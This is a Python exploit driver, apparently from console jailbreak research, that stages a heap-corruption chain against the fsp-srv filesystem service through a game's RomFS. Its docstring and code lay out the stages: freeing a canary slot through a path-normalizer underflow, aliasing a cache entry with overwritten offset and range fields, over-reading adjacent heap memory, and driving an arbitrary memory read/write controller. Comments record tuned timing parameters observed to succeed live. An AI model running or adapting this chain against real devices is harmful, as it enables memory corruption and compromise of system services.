"""Leak-cycle v2: stage-faithful to ns2jb's cache-leak chain (pass-5 corrections).

IMPORTANT conceptual model (pass-5 review): IStorage::Read (command 200 handle) reads
Civ VII's RomFS through fsp-srv's clean read cache. It does NOT read fsp-srv's heap
until the cache has been ALIASED by the full chain:

  A. positive wave (pieces[2] = '/\\.'): underflows the normalizer, frees the canary
     slot -> canaryChanged = true.
  B. candidateHandle = command 200 on the reserved root + 16-byte priming read:
     fsp-srv allocates the storage's 0x5a0 cache bucket/entry table INSIDE the freed
     canary slot.
  C. installCombinedLeak: copyField waves (/..\\ + nulWrites) overwrite the cache
     entry's file-offset (aliasOffset = 0x1400000) and widen its valid range
     (0x4141414141414141).
  D. over-read: readStorage(candidateHandle, 0x1c000, 0x1400000) — the widened range
     makes fsp-srv serve 0x1c000 bytes out of ONE 0x4000 heap buffer: bytes 0x4000+
     are adjacent fsp-srv heap blocks (the actual leak).
  E. neighbor cache invalidation (command 5) frees adjacent clean caches onto the
     freelist, writing freelist next-pointers into block heads (changedLink).

Running leak-cycle.py after plain extent-present waves tests NOTHING: it reads
uncorrupted RomFS. This script therefore stages the ns2jb order and REFUSES to run
the alias steps until the wave prerequisites hold (canary chain staging fixed,
release-before-trigger).

The prerequisite sweep (CIV_PREREQ_MAX samples, default 3) searches for the window. The winning
sample observed live: RELEASE_DELAY=300000 + CIV_PRE_BRACKET off + CIV_COMMIT_DELAY=1800000/
2000000 (the commit delay keeps CloseObject(outer) from deferring behind commit).

Usage: python leak-cycle.py [stage]   stage = romfs (default, control only) |
        full / alias (the A-D cache-alias chain; CIV_ALLOW_OVERWRITE=1 and CIV_ALIAS_UPTO set
        how far to go: positive | prime | install | read) |
        memctl (FsMemoryControl-driven select/read/write over the aliased cache)
"""
import sys, json, struct, hashlib, glob, os

# Parse the stage BEFORE clobbering sys.argv: host.py is imported for its codecs and would
# otherwise parse leak-cycle's argv. The old order reset sys.argv first, so `stage` always fell
# back to "romfs" and every alias stage (full/memctl) was unreachable regardless of the guard.
stage = sys.argv[1] if len(sys.argv) > 1 else "romfs"
sys.argv = ["host.py"]
import importlib.util
spec = importlib.util.spec_from_file_location("h", "host.py")
m = importlib.util.module_from_spec(spec)
sys.modules["h"] = m
try:
    spec.loader.exec_module(m)
except SystemExit:
    pass

h = m.Harness(host="192.168.103.215")

def scan(dump, tag):
    """findNativeLinks-faithful: block heads only, zeroTail/zeroAfter32 signals."""
    hits, heads = [], []
    for name in (b"CIV_GAP", b"SPAN_MARKER", b"/\\."):
        at = dump.find(name)
        if at >= 0:
            hits.append((name.decode(), hex(at)))
    for head in range(0, len(dump) - 8, 0x4000):
        v = struct.unpack_from("<Q", dump, head)[0]
        if not (0x100000000 <= v < (1 << 39) and v % 0x4000 == 0 and v & 0xffffff):
            continue
        zeroTail = not any(dump[head + 8:head + 64])
        zeroAfter32 = not any(dump[head + 32:head + 0x4000])
        heads.append({"at": hex(head), "target": hex(v),
                      "zeroTail": zeroTail, "zeroAfter32": zeroAfter32})
    print("[%s] strings=%s headCandidates=%s" % (tag, hits, heads[:8]), flush=True)
    return hits, heads

print("== stage 0: romfs control reads (expect identical across calls) ==", flush=True)
control = None
if os.environ.get("CIV_STAGE0_SKIP"):
    # (c)-path: both mid-readback payload-fatals (boot 19/22 draw 1) followed this stage's
    # rx_page/block allocations; skipping it tests the confound directly. Stage B derives
    # the storage size inline (GetSize on the opened control storage) when skipped.
    print("CIV_STAGE0_SKIP=1: skipping the romfs control reads (crash-confound test)", flush=True)
else:
    control = h.leak_read(4, label="leak-control")
    for block in control["blocks"]:
        data = (m.RUNS / block["file"]).read_bytes()
        scan(data, block["file"])
if stage not in ("full", "memctl", "alias"):
    print("romfs control done; alias stages need the wave prerequisites (see docstring)", flush=True)
    raise SystemExit(0)

if os.environ.get("CIV_PREREQ_SKIP"):
    print("CIV_PREREQ_SKIP=1: skipping the wave prerequisites (controller smoke test only)", flush=True)
print("== wave prerequisites: extent-present must qualify with windowOk AND the release", flush=True)
print("   must close BEFORE the trigger (pass-5 findings) before positive can alias ==", flush=True)
# The alias chain needs the reservation's release to have CLOSED before the trigger's lookup
# (the candidate prime reuses the freed canary slot). Force the trigger to wait on the actual
# close; without this the early `released` handshake lets close_gap stay positive (review 4.4).
os.environ.setdefault("CIV_RELEASE_CLOSE_GATE", "1")
# The harvest config signals `released` early (CIV_RELEASE_EARLY=1), which can leave close_gap
# positive, while that same early handshake is what makes allPending deterministic. Both are
# required by the alias chain, so try the ambient config first and fall back to variants that
# order the release's close before the trigger. Every attempt shares the one setup (host-side
# rereserve only), per the one-setup-per-payload hygiene rule.
# (overrides, accepted_if_passing). The first entry is a diagnostic BASELINE: the proven wave
# with the close gate OFF. It cannot satisfy release-before-trigger, but it is the exact config
# prior boots ran, so if THIS wave survives while a later close-gated one dies, the gate (not the
# payload/setup) is the cause. All attempts share one setup.
# The baseline (proven wave, close gate off) is diagnostic only and costs a wave cycle, so it
# is opt-in (review point 3). Accepted variants all require release-before-trigger.
PREREQ_VARIANTS = []
if os.environ.get("CIV_PREREQ_BASELINE"):
    PREREQ_VARIANTS.append(({"CIV_RELEASE_CLOSE_GATE": None}, False))
# Observed failure is END-side: with the close gate the trigger runs after release.endUs
# (~3.9 ms), by which point canary/fillers/tails have already ended (r.endUs < trigger.endUs,
# which also sets completedFlag and trips nativeGuard). Pulling them EARLIER widened that miss.
# The fix is to land release.endUs EARLIER (before the ~2.2 ms deferral burst, so close_object is
# not itself deferred) while the harvest trigger window is preserved.
#
# Any variant that unsets CIV_RELEASE_EARLY MUST also set CIV_GUARD_DELAY=0: with early release
# gate["released"] fires at t=0 so GUARD_DELAY places the guards; with it unset, `released` fires
# at release.end and the 2.55 ms guard sleep is added ON TOP (guards ~6.45 ms, long after the
# non-guard roles finished).
#
# Capped at 3 samples per payload: a wedge needs a full reboot, and a boot only tolerates a few
# reservation/wave cycles.
# Live data (2026-11-05), two lessons that fix the direction:
#   1. The trigger's START is set by guard1's `guard` signal (wait(released)+GUARD_DELAY) + the
#      trigger tail; it is NOT set by the close unless the close is later than that. So do NOT
#      raise GUARD_DELAY / PROTECT_SHIFT: that moves the trigger past the proven ~2.4 ms protected
#      window and guarantees an END-side miss.
#   2. With RELEASE_DELAY=300000 + no PRE_BRACKET the close is already ~1.0 ms, comfortably before
#      the ~2.4 ms trigger. Keep the harvest protected/guard timing and just make the close early:
#      release.endUs < trigger.startUs with the harvest window intact.
#
# Warm-up matters: wave 1's hole read is cold and its deferred roles/trigger can slip to ~9 ms, so
# wave 1 is a warm-up; wave 2+ reads the 1.5 MB range cached and is the real test. The likely
# winner sits at wave 2.
#
# WINNER (round-31, passed live): {RELEASE_DELAY=300000, PRE_BRACKET off, COMMIT_DELAY=1800000}
# on wave 2 gave allPending=True, windowOk=True, close_gap=-1432 us, then memctl ran.
PREREQ_VARIANTS += [
    ({}, True),
    ({"CIV_RELEASE_DELAY": "300000", "CIV_PRE_BRACKET": None,
      "CIV_COMMIT_DELAY": "1800000"}, True),
    ({"CIV_RELEASE_DELAY": "300000", "CIV_PRE_BRACKET": None,
      "CIV_COMMIT_DELAY": "2000000"}, True),
]
if os.environ.get("CIV_PREREQ_SKIP"):
    PREREQ_VARIANTS = []
PREREQ_VARIANTS = PREREQ_VARIANTS[:int(os.environ.get("CIV_PREREQ_MAX", "3"))]
_ambient = {key: os.environ.get(key) for variant, _accept in PREREQ_VARIANTS for key in variant}

def _apply(overrides, restore=False):
    source = _ambient if restore else overrides
    for key in overrides:
        value = source.get(key)
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value

row = None
for _index, (_variant, _accept) in enumerate(PREREQ_VARIANTS):
    _apply(_variant)
    if _index:
        h.rereserve()
        _allocs = h.state.get("wave_allocs") or []
        if _allocs:
            try:
                h.console.request("freeAddresses", addresses=_allocs)
            except Exception:
                pass
        h.state["wave_allocs"] = []
    try:
        row = h.worker_wave("extent-present", 1)
    except SystemExit as exc:
        print("extent-present refused:", exc, flush=True)
        _apply(_variant, restore=True)
        continue
    try:
        close_gap = row["timing"]["release"]["endUs"] - row["timing"]["trigger"]["startUs"]
    except (KeyError, TypeError):
        close_gap = None
    print("extent-present[%d %s]%s: AP %s sel %s win %s closeEnd-vs-triggerStart %s us"
          % (_index, _variant or "ambient", "" if _accept else " (baseline)", row.get("allPending"),
             row.get("selectedMarker"), row.get("windowOk"),
             "n/a" if close_gap is None else "%.0f" % close_gap), flush=True)
    # worker_wave overwrites runs/worker-wave-extent-present.json each call; keep a per-variant
    # copy so the sweep's individual rows survive (the last run lost all but the final variant).
    try:
        _src = m.RUNS / "worker-wave-extent-present.json"
        if _src.exists():
            (m.RUNS / ("prereq-variant-%d.json" % _index)).write_text(_src.read_text())
    except OSError:
        pass
    if _accept and row.get("windowOk") and close_gap is not None and close_gap < 0:
        print("prerequisite satisfied by variant %d" % _index, flush=True)
        break
    _apply(_variant, restore=True)
else:
    if os.environ.get("CIV_PREREQ_SKIP"):
        row = None
    else:
        print("no prerequisite variant satisfied windowOk AND release-before-trigger", flush=True)
        raise SystemExit(1)

if stage not in ("full", "memctl", "alias"):
    print("unknown stage:", stage, flush=True)
    raise SystemExit(1)

# ---- stage alias/full: the ns2jb cache-alias chain (A-E) --------------------
# Faithful order: positive wave (A) -> reserve + open candidate + prime (B) ->
# installCombinedLeak copyField writes (C) -> over-read past the widened range (D).
# CIV_ALIAS_UPTO stops after a sub-stage so a boot can validate one step at a time:
#   positive (default) | prime | install | read
if stage in ("full", "alias"):
    from fs_memory_control import FsMemoryControl
    import signed_cache_plan
    from cache_address_plan import nul_writes
    if not os.environ.get("CIV_ALLOW_OVERWRITE"):
        print("alias chain needs CIV_ALLOW_OVERWRITE=1 (positive wave overwrites the canary)", flush=True)
        raise SystemExit(1)
    if row is not None:
        _gap = row["timing"]["release"]["endUs"] - row["timing"]["trigger"]["startUs"]
        if not row.get("windowOk") or _gap >= 0:
            print("prerequisite failed for the alias chain (windowOk=%s gap=%s)"
                  % (row.get("windowOk"), _gap), flush=True)
            raise SystemExit(1)
    upto = os.environ.get("CIV_ALIAS_UPTO", "positive")
    alias_offset = int(os.environ.get("CIV_ALIAS_OFFSET", "0x1400000"), 0)
    cache_read_size = int(os.environ.get("CIV_ALIAS_READ_SIZE", "0x8000"), 0)
    storage_size = (control or {}).get("storageSize")
    print("== stage %s: cache-alias chain (up to %s, aliasOffset=0x%x) =="
          % (stage, upto, alias_offset), flush=True)

    def _drop_wave_pages():
        _allocs = h.state.get("wave_allocs") or []
        if _allocs:
            try:
                h.console.request("freeAddresses", addresses=_allocs)
            except Exception:
                pass
        h.state["wave_allocs"] = []

    # -- A: positive wave frees the canary slot -------------------------------
    # Sweep the marker offset: with 0x2340 the trigger aborts (0x2EEA02); §30 recorded that
    # 0x2140 resolved (result 0). CIV_ALIAS_MARKERS is a comma list, tried in order until the
    # canary changes. CIV_ALIAS_MARKERS_MAX caps the waves spent here (default 2).
    _markers_env = os.environ.get("CIV_ALIAS_MARKERS")
    if _markers_env:
        markers = [int(part, 0) for part in _markers_env.split(",") if part]
    elif os.environ.get("CIV_MARKER_OFFSET"):
        markers = [int(os.environ["CIV_MARKER_OFFSET"], 0)]
    else:
        markers = [m.MARKER_OFFSET]
    markers = markers[:max(1, int(os.environ.get("CIV_ALIAS_MARKERS_MAX", "2")))]
    pos = None
    for marker in markers:
        os.environ["CIV_MARKER_OFFSET"] = hex(marker)
        _drop_wave_pages()
        h.rereserve()
        pos = h.worker_wave("positive", 1)
        print("positive[marker=0x%x]: AP %s canaryChanged %s canaryType %s changed %s win %s"
              % (marker, pos.get("allPending"), pos.get("canaryChanged"),
                 pos.get("canaryType"), pos.get("changedPaths"), pos.get("windowOk")), flush=True)
        if pos.get("canaryChanged") and pos.get("allPending"):
            break
    if not (pos and pos.get("canaryChanged") and pos.get("allPending")):
        print("positive wave did not free the canary (canaryChanged AND allPending required)", flush=True)
        raise SystemExit(1)
    if upto == "positive":
        raise SystemExit(0)

    # -- B: reserve, open the candidate handle, prime it ----------------------
    _drop_wave_pages()
    h.rereserve()
    root = h.cached_session("wave_root_handle", "wave-root")
    control_storage = m.parse_reply(h.console.request("send", handle=root, packet=m.packet(200).hex())["hex"])
    assert not control_storage["result"] and control_storage["moves"], "control storage open failed"
    control_handle = control_storage["moves"][0]
    if not storage_size:
        # CIV_STAGE0_SKIP: no stage-0 control dict; GetSize inline on the control storage.
        _sz = m.parse_reply(h.console.request("send", handle=control_handle,
                                               packet=m.packet(4).hex())["hex"])
        assert not _sz["result"], "control storage GetSize failed"
        storage_size = struct.unpack_from("<Q", _sz["data"], 0)[0]
        assert storage_size, "no storageSize from GetSize"
    opened = m.parse_reply(h.console.request("send", handle=root, packet=m.packet(200).hex())["hex"])
    assert not opened["result"] and opened["moves"], "candidate open failed"
    candidate = opened["moves"][0]
    initial_plan = signed_cache_plan.plan(0x123456789, storage_size, 0x500000)
    ctl = FsMemoryControl(h.console, m, candidate_handle=candidate, storage_size=storage_size,
                          initial_plan=initial_plan,
                          input_addr=h.console.request("alloc", pages=1)["address"],
                          copy_field=h.copy_field_wave)
    control_size = max(0x8000, cache_read_size)
    control = ctl._poisoned_read(control_handle, 0, control_size, 0xA5)
    assert not control["result"], "cache-range content control failed"
    alias_control = ctl._poisoned_read(control_handle, alias_offset, 16, 0xA5)
    assert not alias_control["result"] and alias_control["bytes"] != control["bytes"][:16], \
        "alias control does not distinguish the two offsets"
    prime = ctl._poisoned_read(candidate, 0, 16, 0xA5)
    assert not prime["result"] and prime["bytes"] == control["bytes"][:16], "candidate content differs"
    print("candidate primed: %s (matches control prefix)" % prime["bytes"].hex(), flush=True)
    if upto == "prime":
        raise SystemExit(0)

    # -- C: installCombinedLeak ------------------------------------------------
    desired = bytearray(0x12)
    desired[0:8] = m.u64(alias_offset)
    desired[8:16] = m.u64(0x4141414141414141)
    desired[0x10] = 1
    steps = nul_writes(bytes(desired))
    assert len(steps) == 7, "combined prefix needs 7 copies"
    field_copies = int(os.environ.get("CIV_FIELD_COPIES", "2"))
    for step in steps:
        h.copy_field_wave(step["bytes"], "combined-leak-%d" % step["end"],
                          required_copies=field_copies)
    aliased = ctl._poisoned_read(candidate, alias_offset, 16, 0xA5)
    print("aliased read: result %s observed %s selectedAlias %s"
          % (aliased["result"], (aliased["bytes"] or b"").hex(),
             bool(aliased["bytes"] and aliased["bytes"] == prime["bytes"])), flush=True)
    if upto == "install":
        raise SystemExit(0)

    # -- D: over-read past the widened range ----------------------------------
    widened = ctl._poisoned_read(candidate, alias_offset, cache_read_size, 0xA5)
    if widened["bytes"]:
        out = m.RUNS / "alias-range-output.bin"
        out.write_bytes(widened["bytes"])
        first_diff = next((i for i, b in enumerate(widened["bytes"]) if b != control["bytes"][i]), -1)
        print("over-read: result %s len %d firstDifference 0x%x file %s"
              % (widened["result"], len(widened["bytes"]), first_diff, out.name), flush=True)
    raise SystemExit(0)

# ---- stage memctl: FsMemoryControl-driven memory operations -----------------
if stage == "memctl":
    print("== stage memctl: FsMemoryControl select/read/write ==", flush=True)
    # Unless CIV_PREREQ_SKIP is set, the controller requires the prerequisite checks
    # (windowOk + release-before-trigger) to have passed in this same process.
    if row is None:
        print("CIV_PREREQ_SKIP=1: running the controller against clean RomFS (no wave)", flush=True)
    else:
        if not row.get("windowOk"):
            print("prerequisite failed: extent-present did not qualify a window (windowOk=False)", flush=True)
            raise SystemExit(1)
        close_gap = row["timing"]["release"]["endUs"] - row["timing"]["trigger"]["startUs"]
        if close_gap >= 0:
            print("prerequisite failed: release closes AFTER the trigger (gap=%d us) — " % close_gap,
                  "the alias chain would free the slot while the wave is still live", flush=True)
            raise SystemExit(1)
        if not row.get("selectedMarker"):
            print("WARNING: selectedMarker is False — the trigger did not resolve to the marker, so "
                  "this run validates the controller only (no alias chain)", flush=True)
    # Instantiate the controller against the mounted storage + candidate handle.
    # REVIEW FIX: FsMemoryControl takes the CONSOLE (h.console, the object with .request()),
    # not the Harness, and the candidate handle must actually exist — nothing stored
    # h.state["candidateHandle"] before. Open it here: command 200 on the cached root (the
    # same open the wave's commit role uses), GetSize for the storage size, then the 16-byte
    # priming read. The initial target is a fixed test address (0x123456789) — a real run
    # derives it from the pointer candidates the leak reads produced (handoff §41).
    #
    # SCOPE (review 4.2): this is a clean-RomFS smoke test of the controller, NOT the alias
    # chain. extent-present does not free the canary slot, so the prime read below does not
    # actually reuse it, and the initial plan's header is not installed via copyField — the
    # smoke read is a cache hit on active_plan. That is intentional for P3 step 1.
    from fs_memory_control import FsMemoryControl
    import signed_cache_plan
    storage_size = control.get("storageSize")
    if not storage_size:
        print("prerequisite failed: no storageSize from the romfs control reads", flush=True)
        raise SystemExit(1)
    root = h.cached_session("wave_root_handle", "wave-root")
    opened = m.parse_reply(h.console.request("send", handle=root,
                                             packet=m.packet(200).hex())["hex"])
    assert not opened["result"] and opened["moves"], "storage open failed: " + str(opened["result"])
    storage = opened["moves"][0]
    h.state["candidateHandle"] = storage
    # Stage B: the 16-byte priming read allocates the cache bucket table inside the freed
    # canary slot (ns2jb 'Reuse the canary slot with own content').
    prime = m.parse_reply(h.console.request("send", handle=storage,
        packet=m.packet(0, m.u64(0) + m.u64(16), receive=[{"address":
            h.console.request("alloc", pages=1)["address"], "size": 16, "mode": 1}]).hex())["hex"])
    print("candidate prime read result:", prime.get("result"), flush=True)
    input_addr = h.console.request("alloc", pages=1)["address"]
    initial_plan = signed_cache_plan.plan(0x123456789, storage_size, 0x500000)
    ctl = FsMemoryControl(h.console, m,
                          candidate_handle=storage,
                          storage_size=storage_size,
                          initial_plan=initial_plan,
                          input_addr=input_addr,
                          copy_field=h.copy_field_wave)
    print("memctl ready; dispatching memory 'info'", flush=True)
    print(ctl.dispatch({"command": "info"}), flush=True)
    # Smoke test: a small read through the controller (clean RomFS until the alias chain
    # runs; this validates the readBlock machinery against the real console).
    smoke = ctl.dispatch({"command": "read", "address": initial_plan["target"], "length": 0x1000})
    print("memctl smoke read:", {k: smoke[k] for k in ("length", "sha256", "outputFile")}, flush=True)
